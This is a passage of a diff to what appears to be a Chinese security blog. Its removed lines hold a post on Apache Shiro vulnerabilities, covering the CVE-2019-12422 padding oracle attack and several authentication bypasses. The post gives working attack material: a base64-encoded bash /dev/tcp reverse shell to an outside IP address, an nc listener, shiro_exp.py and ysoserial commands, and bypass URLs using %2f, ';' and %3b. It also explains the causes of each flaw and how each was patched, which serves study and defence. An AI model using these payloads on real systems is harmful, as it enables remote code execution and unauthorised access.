-<p><strong>执行命令/shell</strong>：<code>bash -i &gt;&amp; /dev/tcp/127.0.0.1/63497 0&gt;&amp;1</code>    #监听ip，监听端口</p>
-<p><strong>Base64编码</strong>：</p>
-<p><code>YmFzaCAtaSA+JiAvZGV2L3RjcC8yNy4xNTUuODcuODkvMzI0NjAgMD4mMQ==</code></p>
-<p><strong>反弹Shell/payload</strong>：</p>
-<p><code>bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8yNy4xNTUuODcuODkvMzI0NjAgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code></p>
-<ul>
-<li> <strong>步骤2：使用工具（shiro_exp.py）执行bash反弹shell</strong></li>
-</ul>
-<p>攻击者监听端口：<code>nc -lvvp 4444</code></p>
-<p>执行攻击，payload如下：</p>
-<p><code>Python .\exp.py -t -u http://目标ip：端口/doLogin -p ‘bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8yNy4xNTUuODcuODkvMzI0NjAgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code></p>
-<p><img src="/2023/08/13/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20230813181426684.png" alt="image-20230813181426684">                    </p>
-<p>反弹shell成功</p>
-<p><img src="/2023/08/13/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20230813181439922.png" alt="image-20230813181439922"></p>
-<h2 id="远程安全限制绕过漏洞（CVE-2016-6802）"><a href="#远程安全限制绕过漏洞（CVE-2016-6802）" class="headerlink" title="远程安全限制绕过漏洞（CVE-2016-6802）"></a>远程安全限制绕过漏洞（CVE-2016-6802）</h2><h3 id="0x01-漏洞介绍"><a href="#0x01-漏洞介绍" class="headerlink" title="0x01 漏洞介绍"></a>0x01 漏洞介绍</h3><p><strong>【漏洞类型</strong>】：未授权访问</p>
-<p>​        shiro在路径控制的时候，未能对传入的url编码进行decode解码，导致攻击者可以绕过过滤器，访问被过滤的路径。</p>
-<h3 id="0x02-漏洞环境-测绘指纹-1"><a href="#0x02-漏洞环境-测绘指纹-1" class="headerlink" title="0x02 漏洞环境/测绘指纹"></a>0x02 漏洞环境/测绘指纹</h3><p>shrio &lt;1.3.2</p>
-<h3 id="0x03-POC-EXP-漏洞利用-1"><a href="#0x03-POC-EXP-漏洞利用-1" class="headerlink" title="0x03 POC/EXP/漏洞利用"></a>0x03 POC/EXP/漏洞利用</h3><p>​        访问某shrio某些敏感url的时候（如/admin），页面返回403（未授权）。因此可以确定admin路径是属于被过滤路径。此时使用burp截断，然后在访问路径的最后添加%2f，既可绕过shiro检测。因为对于浏览器来说%2f会被自动编码为/，但是burp截断之后进入shiro，shiro未对其解码，所以可以绕过。</p>
-<h2 id="Padding-Oracle-AttackRCE-721（CVE-2019-12422）"><a href="#Padding-Oracle-AttackRCE-721（CVE-2019-12422）" class="headerlink" title="Padding Oracle AttackRCE-721（CVE-2019-12422）"></a>Padding Oracle AttackRCE-721（CVE-2019-12422）</h2><h3 id="0x01-漏洞介绍-1"><a href="#0x01-漏洞介绍-1" class="headerlink" title="0x01 漏洞介绍"></a>0x01 漏洞介绍</h3><p>​        shrio中的remenbermecookie字段是采用AES-128-CBC加密的，因此容易受到oracle填充攻击，攻击者可以采用有效的cookie字段来作为paddingoracleattack的前缀，然后精心构造反序列化字段进行命令执行。</p>
-<h3 id="0x02-漏洞环境-测绘指纹-2"><a href="#0x02-漏洞环境-测绘指纹-2" class="headerlink" title="0x02 漏洞环境/测绘指纹"></a>0x02 漏洞环境/测绘指纹</h3><ul>
-<li><p>Apache     Shiro： 1.2.5, 1.2.6, 1.3.0, 1.3.1,     1.3.2, 1.4.0-RC2, 1.4.0, 1.4.1</p>
-</li>
-<li><p>利用的前提：需要能够获取正常的remenberMe的cookie，所以我们需要进入后台，获取正常的cookie</p>
-</li>
-</ul>
-<h3 id="0x03-POC-EXP-漏洞利用-2"><a href="#0x03-POC-EXP-漏洞利用-2" class="headerlink" title="0x03 POC/EXP/漏洞利用"></a>0x03 POC/EXP/漏洞利用</h3><ul>
-<li><strong>步骤1：ysoserial生成反序列化payload</strong></li>
-</ul>
-<p>执行：<code>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 bash -i &gt;&amp; /dev/tcp/xx.xx.xx.xx/4444 0&gt;&amp;1’ &gt; linux_shell.class</code></p>
-<p>工具包： ysoserial-0.0.6-SNAPSHOT-all.jar</p>
-<p>得到payload</p>
-<p>CVLt9Uxe8Y+wYtBAg8OqeYytEKI04csCy916LpA8ndWPk0GHmv7iFB8nZIsnZmS00MLpOgHQD3+KRUlVQA09b7HFgios2tfD3ja6dKwoE4n4Y6h6tX2oZMwedIpmIBp59a6V8qqSk9chl1epO9up3ZJKrvQLs6CgRoA10Q4ZK0Jy00DQmFWWAvNI22tf4P68R/i2jOSSZ3+0KXme04jIWbYjcY7jVtD8RqehLDjHVxARWp8LVROQhHov2Gk2pEbXQs5MTF7sw1Nf6gcP6B1JizNWNvy23D0QVlGCqwu3qvwDaC2WUZm87DUr3fsOY6yOaDBk/Gpx1G6RJHN8LHJQ8zJVUfPJTX156B2ABq00xtCrXxjOWQpDVCrqjRoNHZ3qYVDITv7k/1Tmmwgayjv8F5nWLP+feY+oKIjt+eW5JVs0Ky2hbjDHin8KefdcuA+wK34NFyIbZi0abIjhKmqval5h/IjE6xMiGcA3Dsi/cuJGhHp0YbcWYuyxAfVCa15V</p>
-<ul>
-<li><strong>步骤2（方式1）：使用PaddingOracleAttack-1.0-SNAPSHOT.jar进行漏洞利用</strong></li>
-</ul>
-<p><code>java -jar PaddingOracleAttack-1.0-SNAPSHOT.jar http://xx.xx.xx.xx:8080/</code> CVLt9Uxe8Y+wYtBAg8OqeYytEKI04csCy916LpA8ndWPk0GHmv7iFB8nZIsnZmS00MLpOgHQD3+KRUlVQA09b7HFgios2tfD3ja6dKwoE4n4Y6h6tX2oZMwedIpmIBp59a6V8qqSk9chl1epO9up3ZJKrvQLs6CgRoA10Q4ZK0Jy00DQmFWWAvNI22tf4P68R/i2jOSSZ3+0KXme04jIWbYjcY7jVtD8RqehLDjHVxARWp8LVROQhHov2Gk2pEbXQs5MTF7sw1Nf6gcP6B1JizNWNvy23D0QVlGCqwu3qvwDaC2WUZm87DUr3fsOY6yOaDBk/Gpx1G6RJHN8LHJQ8zJVUfPJTX156B2ABq00xtCrXxjOWQpDVCrqjRoNHZ3qYVDITv7k/1Tmmwgayjv8F5nWLP+feY+oKIjt+eW5JVs0Ky2hbjDHin8KefdcuA+wK34NFyIbZi0abIjhKmqval5h/IjE6xMiGcA3Dsi/cuJGhHp0YbcWYuyxAfVCa15V 16 shell.class</p>
-<p>得到破解结果后burpsuite重放替换cookie后的数据包，成功反弹shell</p>
-<ul>
-<li><strong>步骤2（方式2）：使用shiro_exp.py进行漏洞利用</strong></li>
-</ul>
-<p>python2 shiro_exp.py <a target="_blank" rel="noopener" href="http://xx.xx.xx.xx:8080/samples-web-1.4.1/home.jspCVLt9Uxe8Y+wYtBAg8OqeYytEKI04csCy916LpA8ndWPk0GHmv7iFB8nZIsnZmS00MLpOgHQD3+KRUlVQA09b7HFgios2tfD3ja6dKwoE4n4Y6h6tX2oZMwedIpmIBp59a6V8qqSk9chl1epO9up3ZJKrvQLs6CgRoA10Q4ZK0Jy00DQmFWWAvNI22tf4P68R/i2jOSSZ3+0KXme04jIWbYjcY7jVtD8RqehLDjHVxARWp8LVROQhHov2Gk2pEbXQs5MTF7sw1Nf6gcP6B1JizNWNvy23D0QVlGCqwu3qvwDaC2WUZm87DUr3fsOY6yOaDBk/Gpx1G6RJHN8LHJQ8zJVUfPJTX156B2ABq00xtCrXxjOWQpDVCrqjRoNHZ3qYVDITv7k/1Tmmwgayjv8F5nWLP+feY+oKIjt+eW5JVs0Ky2hbjDHin8KefdcuA+wK34NFyIbZi0abIjhKmqval5h/IjE6xMiGcA3Dsi/cuJGhHp0YbcWYuyxAfVCa15V">http://xx.xx.xx.xx:8080/samples-web-1.4.1/home.jspCVLt9Uxe8Y+wYtBAg8OqeYytEKI04csCy916LpA8ndWPk0GHmv7iFB8nZIsnZmS00MLpOgHQD3+KRUlVQA09b7HFgios2tfD3ja6dKwoE4n4Y6h6tX2oZMwedIpmIBp59a6V8qqSk9chl1epO9up3ZJKrvQLs6CgRoA10Q4ZK0Jy00DQmFWWAvNI22tf4P68R/i2jOSSZ3+0KXme04jIWbYjcY7jVtD8RqehLDjHVxARWp8LVROQhHov2Gk2pEbXQs5MTF7sw1Nf6gcP6B1JizNWNvy23D0QVlGCqwu3qvwDaC2WUZm87DUr3fsOY6yOaDBk/Gpx1G6RJHN8LHJQ8zJVUfPJTX156B2ABq00xtCrXxjOWQpDVCrqjRoNHZ3qYVDITv7k/1Tmmwgayjv8F5nWLP+feY+oKIjt+eW5JVs0Ky2hbjDHin8KefdcuA+wK34NFyIbZi0abIjhKmqval5h/IjE6xMiGcA3Dsi/cuJGhHp0YbcWYuyxAfVCa15V</a> shell.class</p>
-<ul>
-<li><strong>步骤2-1：经过漫长的时间后得到cookie，然后替代刚抓包的cookie，重放即可</strong></li>
-</ul>
-<h2 id="Shiro-spring时身份验证绕过漏洞分析（CVE-2020-1957）"><a href="#Shiro-spring时身份验证绕过漏洞分析（CVE-2020-1957）" class="headerlink" title="Shiro + spring时身份验证绕过漏洞分析（CVE-2020-1957）"></a>Shiro + spring时身份验证绕过漏洞分析（CVE-2020-1957）</h2><h3 id="0x01-漏洞介绍-2"><a href="#0x01-漏洞介绍-2" class="headerlink" title="0x01 漏洞介绍"></a>0x01 漏洞介绍</h3><p>【<strong>漏洞类型</strong>】未授权访问（绕过）</p>
-<h3 id="0x02-漏洞原理"><a href="#0x02-漏洞原理" class="headerlink" title="0x02 漏洞原理"></a>0x02 漏洞原理</h3><p>【<strong>知识补充1】Shiro拦截器</strong></p>
-<p>​        Shiro框架通过拦截器功能来实现对用户访问权限的控制和拦截。Shiro中常见的拦截器有anon,authc等拦截器。</p>
-<ul>
-<li><p><strong>anon匿名拦截器</strong>，不需要登录就能访问，一般用于静态资源,或者移动端接口</p>
-</li>
-<li><p> <strong>authc登录拦截器</strong>，需要登录认证才能访问的资源。</p>
-</li>
-</ul>
-<p>配置示例</p>
-<p>​        index.html = anon</p>
-<p>​        /user/** = authc</p>
-<p>​        访问 /index.html主页的时候，Shiro将不会对其进行登录判断，anon拦截器不需要登录就能进行访问。而对于/user/xiaoming 等 /user/xiaogang等接口，authc拦截器将会对其进行登录判断，有登录认证才能访问资源。</p>
-<p>【<strong>知识补充2</strong>】Ant 格式的url</p>
-<p><strong>路径通配符</strong></p>
-<ul>
-<li><p> **?**：匹配一个字符</p>
-</li>
-<li><p> *****：匹配零个或多个字符串</p>
-</li>
-<li><p> <strong>**</strong>：匹配路径中的零个或多个路径</p>
-</li>
-<li><p> <strong>;</strong> <strong>：</strong>截段分隔符</p>
-</li>
-</ul>
-<p>【<strong>原理</strong>】</p>
-<p>​     <strong>一句话总结：若访问/hello/1需要授权，但用/hello/1/可以绕过shiro路径匹配函数，到spring拦截器时，/hello/1/与/hello/1是一样的。</strong>具体原理细节如下：</p>
-<p>​        Shiro处理url时，会调用PathMatchingFilterChainResolver的getChain函数，<strong>getChain函数根</strong>据URL路径匹配中配置的url路径表达式来匹配输入的URL，判断是否匹配拦截器，匹配成功将会返回响应的拦截器执行链，让ShiroFither执行权限操作的。</p>
-<p>​        getChain主要通过<strong>pathMathches函数</strong>进行匹配路径表达式。pathMatches函数最终会调用shiro.util.AntPathMatcher类中的<strong>doMatch</strong>对于ant格式的pathPattern和requestURI进行匹配。</p>
-<p>​        而Shiro 的Ant格式的<strong>pathPattern</strong> 中的的“*”通配符是不支持匹配路径的，所以/hello/*****不能成功匹配/hello/1/，也就不会触发authc拦截器进行权限拦截。从而成功绕过了Shiro拦截器，而后再进入到spring拦截器中，/hello/1/与/hello/1能获取到相同的资源。</p>
-<p><strong>【关系链】</strong>：<strong>PathMatchingFilterChainResolver（url处理）⟶ getChain函数（权限判定）⟶ pathMatches函数（url匹配）⟶pathPattern匹配失败而绕过shiro拦截器。</strong></p>
-<p>{“⟶”代表引用/调用关系}</p>
-<h3 id="0x03-漏洞环境-测绘指纹"><a href="#0x03-漏洞环境-测绘指纹" class="headerlink" title="0x03 漏洞环境/测绘指纹"></a>0x03 漏洞环境/测绘指纹</h3><ul>
-<li>JIRA     issueSHIRO-682</li>
-<li>Shiro     &lt; 1.5.0</li>
-</ul>
-<h3 id="0x04-POC-EXP-漏洞利用"><a href="#0x04-POC-EXP-漏洞利用" class="headerlink" title="0x04 POC/EXP/漏洞利用"></a>0x04 POC/EXP/漏洞利用</h3><p>​        /*<em>可以匹配/hello，但匹配不到/hello/；因为</em>通配符无法匹配路径。假设/hello接口设置了authc拦截器，访问/hello将会被进行权限判断，如果请求的URI为/hello/，/*URL路径表达式将无法正确匹配，就会放行。然后进入到spring(Servlet)拦截器，spring中/hello形式和/hello/形式的URL访问的资源是一样的。</p>
-<h3 id="0x05漏洞修复"><a href="#0x05漏洞修复" class="headerlink" title="0x05漏洞修复"></a>0x05漏洞修复</h3><p>​        shiro1.5版本修复了pathsMatch函数。修复方式是通过判断requestURI是否以/为结尾，如果以/结尾的话，则去掉尾部的/符号在与URL表达式进行比较。</p>
-<p>​        那么，当requestURI为/hello/1/等以/为结尾的URI的时候，都会被清除最后的/号，再进行URL路径匹配，那么/hello/1/就会被处理为/hello/1，然后需要授权认证才能访问。</p>
-<h2 id="Apache-Shiro-628权限绕过漏洞-（CVE-2020-2957）"><a href="#Apache-Shiro-628权限绕过漏洞-（CVE-2020-2957）" class="headerlink" title="Apache Shiro 628权限绕过漏洞 （CVE-2020-2957）"></a>Apache Shiro 628权限绕过漏洞 （CVE-2020-2957）</h2><h3 id="0x01-漏洞介绍-3"><a href="#0x01-漏洞介绍-3" class="headerlink" title="0x01 漏洞介绍"></a>0x01 漏洞介绍</h3><p>​        CVE-2020-1957身份认证绕过漏洞修复不完全，CVE-2020-2957是漏洞在之前CVE-2020-1957补丁的基础上进行绕过，访问/hello/1/会进入登录认证，但是通过构造payload:/fdsf;/…/hello/1可以绕过登录认证。</p>
-<h3 id="0x02-漏洞环境-测绘指纹-3"><a href="#0x02-漏洞环境-测绘指纹-3" class="headerlink" title="0x02 漏洞环境/测绘指纹"></a>0x02 漏洞环境/测绘指纹</h3><ul>
-<li>Shiro     &lt;= 1.5.1</li>
-</ul>
-<h3 id="0x03漏洞原理"><a href="#0x03漏洞原理" class="headerlink" title="0x03漏洞原理"></a>0x03漏洞原理</h3><p>​        问题定位到getChain函数中对于requestURI的获取会调用getPathWithinApplication函数。如果输入**/fdsf;/../hello/1<strong>，getPathWithinApplication(request)获取的requestURI为</strong>/fdsf**，而不是我们输入的/fdsf;/../hello/1，从而导致后面的URI路径模式匹配返回False，从而再次绕过了shiro拦截器。</p>
-<p>​        getPathWithinApplication函数中会调用WebUtils (org.apache.shiro.web.util)中的getRequestUri函数获取RequestUri。</p>
-<p>RequestUri函数中最终调用decodeAndCleanUriString函数对URI进行清洗。</p>
-<p>​        如果URI中存在;号的话，则会删除其后面的所有字符。/fdsf;/../hello/1/最终也就变成了/fdsf。</p>
-<p><strong>【关系链】</strong>：<strong>getChain函数（权限判定）</strong></p>
-<p><strong>⟶ getPathWithinApplication函数（获取完整url：http://… /fdsf;/../hello/1）</strong></p>
-<p>⟶ <strong>WebUtils的getRequestUri函数（获取RequestUri：/fdsf;/../hello/1）</strong></p>
-<p>⟶ <strong>decodeAndCleanUriString函数（url清洗）：如果URI中存在;号的话，则会删除其后面的所有字符,得到/fdsf。</strong></p>
-<p><strong>⟶ 绕过shiro拦截器。</strong></p>
-<h3 id="0x04-POC-EXP-漏洞利用-1"><a href="#0x04-POC-EXP-漏洞利用-1" class="headerlink" title="0x04 POC/EXP/漏洞利用"></a>0x04 POC/EXP/漏洞利用</h3><p>​        输入/fdsf;/../hello/1，getPathWithinApplication(request)获取的requestURI为/fdsf，而不是我们输入的/fdsf;/../hello/1，从而导致后面的URI路径模式匹配返回False，从而再次绕过了shiro拦截器。</p>
-<h3 id="0x05漏洞修复-1"><a href="#0x05漏洞修复-1" class="headerlink" title="0x05漏洞修复"></a>0x05漏洞修复</h3><p>​        Shiro1.52。获取requestURI的方式从request.getRequestUri直接获取的方式更改为获取request的ContextPath，ServletPath，PathInfo，然后再重新拼接而成。输入的/fdsf;/../hello/1/，将会被拼接为//hello/1/再进行URI路径匹配，则无法绕过拦截器。</p>
-<p><img src="/2023/08/13/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20230813183906465.png" alt="image-20230813183906465"></p>
-<p><img src="/2023/08/13/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20230813183920110.png" alt="image-20230813183920110"></p>
-<p>【<strong>知识补充</strong>】</p>
-<p>例如：<a target="_blank" rel="noopener" href="http://127.0.0.1:8080/a/rooturl/b/test?c=1%EF%BC%8C%E5%85%B6%E4%B8%ADrooturl%E6%98%AF%E9%A1%B9%E7%9B%AE%E7%9A%84%E6%A0%B9%E7%9B%AE%E5%BD%95">http://127.0.0.1:8080/a/rooturl/b/test?c=1，其中rooturl是项目的根目录</a></p>
-<ul>
-<li><p> getServletPath()：获取能够与“url-pattern”中匹配的路径，注意是完全匹配的部分，*的部分不包括。                                                          # b/test</p>
-</li>
-<li><p>getPageInfo()：与getServletPath()获取的路径互补，能够得到的是“url-pattern”中*d的路径部分                                                                     #c=1</p>
-</li>
-<li><p>getContextPath()：获取项目的根路径                                # /a/rooturl</p>
-</li>
-<li><p>getRequestURI()：获取根路径到地址结尾                        #/a/rooturl/b/test?c=1</p>
-</li>
-<li><p>getRequestURL()：获取请求的地址链接（输入的地址）#<a target="_blank" rel="noopener" href="http://127.0.0.1:8080/a/rooturl/b/test?c=1">http://127.0.0.1:8080/a/rooturl/b/test?c=1</a></p>
-</li>
-<li><p>getServletContext().getRealPath(“/”)：获取“/”在机器中的实际地址</p>
-</li>
-<li><p>getServerName():获取的是域名(xxx.com)</p>
-</li>
-</ul>
-<h2 id="Apache-Shiro权限绕过漏洞分析-CVE-2020-11989"><a href="#Apache-Shiro权限绕过漏洞分析-CVE-2020-11989" class="headerlink" title="Apache Shiro权限绕过漏洞分析(CVE-2020-11989)"></a>Apache Shiro权限绕过漏洞分析(CVE-2020-11989)</h2><h3 id="0x01-漏洞介绍-4"><a href="#0x01-漏洞介绍-4" class="headerlink" title="0x01 漏洞介绍"></a>0x01 漏洞介绍</h3><p>​        总结来说就是当URL进入到Tomcat时，Tomcat判断**/;test/admin/page** 为test应用下的**/admin/page**路由，进入到Shiro时被;截断被认作为/,再进入Spring时又被正确处理为test应用下的/admin/page路由，最后导致shiro的权限绕过。</p>
-<h3 id="0x02-漏洞环境-测绘指纹-4"><a href="#0x02-漏洞环境-测绘指纹-4" class="headerlink" title="0x02 漏洞环境/测绘指纹"></a>0x02 漏洞环境/测绘指纹</h3><ul>
-<li><p>Apache Shiro &lt; 1.5.3</p>
-</li>
-<li><p>Spring 框架中只使用 Shiro 鉴权</p>
-</li>
-<li><p>应用不能部署在根目录，如果为根目录则context-path为空，就会被CVE-2020-1957的patch将URL格式化，即Shiro获取的url与Web框架处理url不一致的情况就能造成权限绕过。若Shiro版本小于1.5.2的话那么该条件就不需要，因为1.5.2版本前，requestURI是直接获取方式，而不是通过getContextPath() 、getServletPath()、getPathInfo()获取并拼接得到。</p>
-</li>
-</ul>
-<h3 id="0x03-漏洞原理"><a href="#0x03-漏洞原理" class="headerlink" title="0x03 漏洞原理"></a>0x03 漏洞原理</h3><p>以输入<font color="red">/;/test/admin/page</font>为例, 若<font color="red">admin/page</font>是授权访问目录,<font color="red">/;/test</font> 是根目录：</p>
-<ul>
-<li><p>由（CVE-2020-2957）修补方式可知；requestURI的获取方式为通过getContextPath() 、getServletPath()、getPathInfo()获取并拼接得到，获取到的requestURI为/;/test//admin/page。</p>
-</li>
-<li><p>然后传入decodeAndCleanUriString，根据“；”进行URL截断，所以最终返回了/，传入后decodeAndCleanUriString变成了/。</p>
-</li>
-</ul>
-<p>（由于“/”不是禁止访问目录，所以可以绕过shiro鉴权拦截器）</p>
-<p><img src="/2023/08/13/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20230813184309614.png" alt="image-20230813184309614"></p>
-<p><strong>contextPath</strong>:/;/test,     应用不能部署在根目录，也就是需要context-path，server.servlet.context-path=/test;</p>
-<p><img src="/2023/08/13/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20230813184327784.png" alt="image-20230813184327784"></p>
-<p>getRequestUri 获取到的是:”/”</p>
-<p><img src="/2023/08/13/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20230813184344695.png" alt="image-20230813184344695"></p>
-<p>decodeAndCleanUriString():/</p>
-<p><img src="/2023/08/13/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20230813184353276.png" alt="image-20230813184353276"></p>
-<ul>
-<li><p><strong>/;/test//admin/page</strong>传入spring控制器（此版本没有权限校验），由getPathWithinServletMapping()格式化处理后，最后返回**/admin/page**，成功访问未授权目录。</p>
-<p>contextPath:/;/test</p>
-<p>PathwithinApp：/test/admin/page</p>
-<p>ServeletPath：/admin/page</p>
-</li>
-</ul>
-<p><img src="/2023/08/13/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20230813184437756.png" alt="image-20230813184437756"></p>
-<p>【<strong>关系链</strong>】</p>
-<ul>
-<li> <strong>Shiro鉴权器</strong></li>
-</ul>
-<p><strong>getChain函数（权限判定）</strong></p>
-<p><strong>⟶ getPathWithinApplication函数（获取完整url：<font color="red">http://… /;/test/admin/page</font>）</strong></p>
-<p><strong>⟶ getRequestUri函数（获取RequestUri：<font color="red">/;/test//admin/page</font>）</strong></p>
-<p><strong>⟶ decodeAndCleanUriString函数（url清洗）：如果URI中存在;号的话，则会删除其后面的所有字符,得到<font color="red">/</font></strong></p>
-<p>⟶ <strong>绕过shiro鉴权器</strong></p>
-<ul>
-<li><strong>spring控制器</strong></li>
-</ul>
-<p><strong>RequestUri（ <font color="red">/;/test//admin/page</font>）传入 spring控制器</strong></p>
-<p><strong>⟶ getPathWithinServletMapping()</strong></p>
-<p><strong>⟶ServeletPath：<font color="red">/admin/page</font></strong></p>
-<p><strong>⟶访问/admin/page</strong></p>
-<h3 id="0x04-POC-EXP-漏洞利用-2"><a href="#0x04-POC-EXP-漏洞利用-2" class="headerlink" title="0x04 POC/EXP/漏洞利用"></a>0x04 POC/EXP/漏洞利用</h3><p>​        只要根据漏洞环境去构造payload地址即可。例如如果直接访问 /test/admin/page，会返回302跳转要求登录，访问 /;/test/admin/page, 就能直接绕过Shiro权限验证，访问到/admin路由中的信息</p>
-<h3 id="0x05-漏洞修复"><a href="#0x05-漏洞修复" class="headerlink" title="0x05 漏洞修复"></a>0x05 漏洞修复</h3><p>​        Shiro 1.5.3修改了URL获取的逻辑，不单独处理context-path，（单独处理时可以在判断context-path时进行绕过）<br> org.apache.shiro.web.util.WebUtils#getPathWithinApplication</p>
-<p><img src="/2023/08/13/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20230813185051542.png" alt="image-20230813185051542"></p>
-<p>因此就无法再通过构造context-path的方式来进行绕过了。</p>
-<h2 id="Apache-Shiro-权限绕过漏洞（CVE-2020-13933）"><a href="#Apache-Shiro-权限绕过漏洞（CVE-2020-13933）" class="headerlink" title="Apache Shiro 权限绕过漏洞（CVE-2020-13933）"></a>Apache Shiro 权限绕过漏洞（CVE-2020-13933）</h2><h3 id="0x01-漏洞介绍-5"><a href="#0x01-漏洞介绍-5" class="headerlink" title="0x01 漏洞介绍"></a>0x01 漏洞介绍</h3><p>​        Apache Shiro的CVE-2020-11989修补补丁依旧存在缺陷，由于shiro和spring在处理url中仍然存在差别，通过构造特殊的HTTP请求，可以再次绕过授权，访问未授权的信息。访问/read/xx，被302重定向到了/login,而访问/read/%3bxxx，能够绕过认证。</p>
-<h3 id="0x02-漏洞环境-测绘指纹-5"><a href="#0x02-漏洞环境-测绘指纹-5" class="headerlink" title="0x02 漏洞环境/测绘指纹"></a>0x02 漏洞环境/测绘指纹</h3><ul>
-<li>Apache Shiro &lt; 1.6.0</li>
-<li> Spring 框架中只使用 Shiro 鉴权</li>
-</ul>
-<h3 id="0x03漏洞原理-1"><a href="#0x03漏洞原理-1" class="headerlink" title="0x03漏洞原理"></a>0x03漏洞原理</h3><p>【<strong>key</strong>】shiro和spring在处理url中仍然存在差别</p>
-<p>假设条件：**/admin/{name}<strong>是授权访问目录（</strong>/admin**不需要授权访问）</p>
-<p>【<strong>shiro处理URI</strong>】</p>
-<p><img src="/2023/08/13/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20230813185238889.png" alt="image-20230813185238889"></p>
-<p>若输入：**/admin/%3bpage**</p>
-<p>传入/admin/%3bpage 解码后为**/admin/;bpage** ，传入removeSenicolon（）</p>
-<p><img src="/2023/08/13/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20230813185337503.png" alt="image-20230813185337503"></p>
-<p>removeSenicolon()根据“；”分隔符进行截取，返回**/admin/**到requestURI。</p>
-<p><img src="/2023/08/13/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20230813185354022.png" alt="image-20230813185354022"></p>
-<p>此处因为/admin/没有匹配到具体资源路径（不需要授权访问），所以通过过滤器到达Spring的处理逻辑。</p>
-<p>【<strong>spring处理URI</strong>】</p>
-<p>​        注意这里Spring的处理逻辑为先去判断URI中是否存在“；”等特殊字符，如果存在就先处理（删除）再匹配路径。（没有先编码再判断是否存在特殊符号）</p>
-<p>getPathWithinApplication()传入getRequestUrl的是<font color="red">/admin/%3bpage</font> <img src="/2023/08/13/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20230813185455706.png" alt="image-20230813185455706"></p>
-<p>DecodeAndCleanUriString()清洗数据的时候，removeSemicolonContentInternal()清洗模块没有进行编码“%3b”，即没有发现“；”，所以返回结果是**/admin/%3bpage<strong>。然后到decodeRequestString()进行解码得到</strong>/admin/;page**.</p>
-<p><img src="/2023/08/13/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20230813185548331.png" alt="image-20230813185548331"></p>
-<p>removeSemicolonContentInternal()执行细节</p>
-<p><img src="/2023/08/13/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20230813185555497.png" alt="image-20230813185555497"></p>
-<p><strong>/admin/;page</strong>之后进行匹配为**/admin/page**，从而获取相应资源。</p>
-<h3 id="0x04-POC-EXP-漏洞利用-3"><a href="#0x04-POC-EXP-漏洞利用-3" class="headerlink" title="0x04 POC/EXP/漏洞利用"></a>0x04 POC/EXP/漏洞利用</h3><p>​        由于shiro和spring在处理url中仍然存在差别，通过构造特殊的HTTP请求，可以再次绕过授权，访问未授权的信息。访问/admin/xx，被302重定向到了/login,而访问/read/%3bxxx，能够绕过认证，直接访问/read/xxx。</p>
-<h3 id="0x05-漏洞修补"><a href="#0x05-漏洞修补" class="headerlink" title="0x05 漏洞修补"></a>0x05 漏洞修补</h3><p>​        添加一个一个InvalidRequestFilter类，该类从全局上对分号，反斜杠和非ASCII字符进行了过滤。</p>
-<p>参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/emgexgb_sef/article/details/123863818">https://blog.csdn.net/emgexgb_sef/article/details/123863818</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -2021,7 +1800,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">85</span>
+          <span class="site-state-item-count">86</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
